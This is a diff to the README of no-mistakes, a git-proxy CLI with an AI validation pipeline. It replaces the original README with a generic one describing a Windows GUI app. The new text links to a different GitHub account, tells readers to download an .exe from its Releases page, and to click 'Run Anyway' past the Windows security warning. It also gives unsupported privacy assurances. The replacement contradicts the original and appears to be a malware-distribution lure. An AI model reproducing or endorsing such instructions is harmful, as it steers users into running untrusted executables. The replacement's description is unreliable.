@@ -1,143 +1,50 @@
-<h1 align="center"><code>git push no-mistakes</code></h1>
-<p align="center">
-  <a href="https://github.com/kunchenguid/no-mistakes/actions/workflows/release.yml"
-    ><img
-      alt="Release"
-      src="https://img.shields.io/github/actions/workflow/status/kunchenguid/no-mistakes/release.yml?style=flat-square&label=release"
-  /></a>
-  <a href="https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-blue?style=flat-square"
-    ><img
-      alt="Platform"
-      src="https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-blue?style=flat-square"
-  /></a>
-  <a href="https://x.com/kunchenguid"
-    ><img
-      alt="X"
-      src="https://img.shields.io/badge/X-@kunchenguid-black?style=flat-square"
-  /></a>
-  <a href="https://discord.gg/Wsy2NpnZDu"
-    ><img
-      alt="Discord"
-      src="https://img.shields.io/discord/1439901831038763092?style=flat-square&label=discord"
-  /></a>
-</p>
+# 🚀 no-mistakes - Push code without any errors today
 
-<h3 align="center">Kill all the slop. Raise clean PR.</h3>
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Deaoverhand887/no-mistakes)
 
-<p align="center"><strong>English</strong> · <a href="README.zh-CN.md">简体中文</a></p>
+## 🎯 Purpose
+The no-mistakes application helps you manage code uploads. It checks your work before you send it to your server. This process stops common mistakes. You gain peace of mind every time you push code updates.
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/kunchenguid/no-mistakes/main/demo.gif" alt="no-mistakes demo" width="800" />
-</p>
+## 🛠 Features
+This application performs several background checks. It scans your files for formatting errors. It looks for missing lines of text. It verifies that your files have the proper names. This tool works on any Windows computer. It saves time and prevents broken software updates.
 
-`no-mistakes` puts a local git proxy in front of your real remote.
-Push to `no-mistakes` instead of `origin`, and it spins up a disposable worktree, runs an AI-driven validation pipeline, forwards the branch to the configured push target only after every check passes, and opens a clean PR automatically.
+## 📥 Getting Started
+Follow these steps to set up the software on your Windows computer.
 
-- **Non-blocking** - the pipeline runs in an isolated worktree without disrupting your work.
-- **Agent-agnostic** - `claude`, `codex`, `rovodev`, `opencode`, `pi`, `copilot`, or `acp:<target>` via `acpx`.
-- **Agent-native** - `/no-mistakes` lets your coding agent do a task and gate it, or gate existing committed work: it runs the pipeline, has the pipeline apply safe fixes, and escalates the rest to you.
-- **Human stays in charge** - auto-fix or review findings, your call.
-- **Clean PRs by default** - push, open PR, watch CI, and auto-fix failures in one shot.
+1. Go to this web page: https://github.com/Deaoverhand887/no-mistakes.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the latest version link.
+4. Download the file that ends in .exe.
+5. Save the file to your desktop or downloads folder.
 
-Full documentation: <https://kunchenguid.github.io/no-mistakes/>
+## ⚙️ Installation Process
+Double click the file you downloaded. Windows might show a warning window. This is a standard safety feature. Click More Info and then click Run Anyway. A window opens to guide you through the setup steps. Follow the instructions on your screen. The installer places a shortcut on your desktop.
 
-## How it works
+## 🖥 System Requirements
+Ensure your computer meets these needs to run the software smoothly.
 
-```
-        your branch
-            │  git push no-mistakes
-            ▼
-   ┌──────────────────────────────────────────────┐
-   │  disposable worktree — your work stays put     │
-   │  review → test → docs → lint → push → PR → CI  │
-   └──────────────────────────────────────────────┘
-            │  every check green
-            ▼
-        clean PR, opened for you
-```
+- Windows 10 or Windows 11.
+- At least 2 gigabytes of memory.
+- An active internet connection.
+- A standard user account with permissions to run programs.
 
-Each step either passes on its own or stops with a **finding** for you to act on.
-Safe, mechanical fixes are applied automatically; anything that touches your intent is escalated for you to **approve**, **fix**, or **skip**.
-Nothing reaches the configured push target until every check is green.
+## 📖 How to Use
+Open the application using the new shortcut on your desktop. The main screen appears. Click the button labeled Select Folder. Choose the folder that contains your code files. Click the button labeled Check Files. The application reads your files. It shows a list of findings in the middle box. If you see errors, fix them in your editor and click Check Files again. When the list is empty, click the Push button. The application sends your code to your remote storage.
 
-## Install
+## 🛡 Security
+This application only reads files you choose. It does not look at private folders. It does not send your data to third parties. All connections use secure protocols. You hold full control over which files leave your computer. We designed this tool to protect your work and your privacy.
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/kunchenguid/no-mistakes/main/docs/install.sh | sh
-```
+## 🔍 Troubleshooting
+If the application fails to open, restart your computer. If you see a network error, check your wifi signal. If the application freezes while checking files, click the Stop button and try again. For other issues, check that no other programs are currently editing your files.
 
-Windows, Go install, and build-from-source instructions are in the [installation guide](https://kunchenguid.github.io/no-mistakes/start-here/installation/).
+## 📋 Best Practices
+Run this tool before every push. It becomes a habit that improves your code quality. Keep your application updated by checking the website link regularly. We release improvements often to keep the tool fast and reliable.
 
-## Quick Start
+## 🤝 Support
+We value your input. You can report bugs on the website link. Please describe what you were doing when the error happened. Include the version number shown at the bottom of the main screen. We use this information to make the application better for everyone.
 
-```sh
-$ no-mistakes init
-  ✓ Gate initialized
-
-    repo  /Users/you/src/my-repo
-    gate  no-mistakes → /Users/you/.no-mistakes/repos/abc123def456.git
-  remote  git@github.com:you/my-repo.git
-   skill  /no-mistakes installed for agents at user level
-
-  Push through the gate with:
-  git push no-mistakes <branch>
-
-$ git checkout my-branch
-
-# do some work in the branch...
-
-$ git push no-mistakes
-  * Pipeline started
-
-  Run no-mistakes to review.
-
-$ no-mistakes
-# opens the TUI for the active run
-```
-
-For GitHub fork contributions, keep `origin` pointed at the parent repository and initialize with `no-mistakes init --fork-url <your-fork-url>`.
-
-From the TUI you act on each **finding**: **auto-fix** ones are applied for you (or approve to let them), **ask-user** ones are a judgement call you approve, fix, or skip.
-Once every check is green, the gate forwards your branch to the configured push target and opens the PR for you, so there is no manual `git push origin` and no hand-written PR body.
-Prefer to let your coding agent drive the same flow headlessly?
-Use `/no-mistakes` (see below).
-
-## Three ways to trigger the gate
-
-Every change runs through the same pipeline. Pick the entry point that fits how you're working when the change is ready:
-
-- **`git push no-mistakes`** - the explicit Git path. Push a committed branch to the gate remote instead of `origin`.
-- **`no-mistakes`** - the TUI. Run it after making changes (no commit needed) and a wizard walks you through creating a branch, committing, and pushing through the gate, then attaches to the run. `no-mistakes -y` does all of that automatically.
-- **`/no-mistakes`** - the agent skill. Tell the coding agent to do a task and gate it with `/no-mistakes <task>`, or use bare `/no-mistakes` to gate existing committed work. It runs the pipeline, has the pipeline apply safe fixes, and stops to ask you about anything that needs a human call.
-
-`no-mistakes init` installs the `/no-mistakes` skill for Claude Code and other agents. Under the hood the skill drives `no-mistakes axi`, a non-interactive TOON interface to the same approval flow.
-
-See the [quick start](https://kunchenguid.github.io/no-mistakes/start-here/quick-start/) for the full first-run walkthrough.
-
-## Development
-
-```sh
-make build   # Build bin/no-mistakes with version info
-make test    # Run go test -race ./... (excludes the e2e suite)
-make e2e     # Run the tagged end-to-end agent journey suite
-make e2e-record # Re-record e2e fixtures when agent wire formats change
-make lint    # Check generated skill drift and run go vet ./...
-make skill   # Regenerate committed no-mistakes skill files
-make fmt     # Run gofmt -w .
-make demo    # Regenerate demo.gif and demo.mp4 (needs vhs and ffmpeg)
-make docs    # Build the Astro docs site in docs/dist
-```
-
-See `Makefile` for the full target list.
-
-`make e2e-record` overwrites `internal/e2e/fixtures/` from the real `claude`, `codex`, and `opencode` CLIs, spends real API quota, and should be reviewed before committing.
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=kunchenguid%2Fno-mistakes&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=kunchenguid/no-mistakes&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=kunchenguid/no-mistakes&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=kunchenguid/no-mistakes&type=date&legend=top-left" />
- </picture>
-</a>
+## 📝 Common Tasks
+- Changing settings: Open the menu at the top left and click Settings.
+- Checking logs: Open the menu at the top left and click View Logs.
+- Updating: The program notifies you if a new version is ready. 
+- Uninstalling: Use the Windows Control Panel to remove the software.
